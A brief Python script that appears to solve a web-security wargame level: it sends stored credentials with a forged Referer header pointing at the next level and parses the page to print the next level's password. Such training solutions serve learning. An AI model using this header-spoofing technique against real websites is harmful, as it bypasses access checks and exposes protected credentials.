#!/usr/bin/env python3

import urllib.request
import base64
import re
from levels_credentials import credentials

level_url = credentials[4]["url"]
level_username = credentials[4]["level"]
level_password = credentials[4]["password"]

next_level_url = credentials[5]["url"]
next_level_username = credentials[5]["level"]

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
headers = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}

req = urllib.request.Request(level_url, None, headers)

with urllib.request.urlopen(req) as response:
    data = response.read()
    strings = re.split('\n|:|\s'.encode("ascii"), data)
    next_password = strings[strings.index(next_level_username.encode("ascii")) + 2]

print(next_password.decode("ascii"))
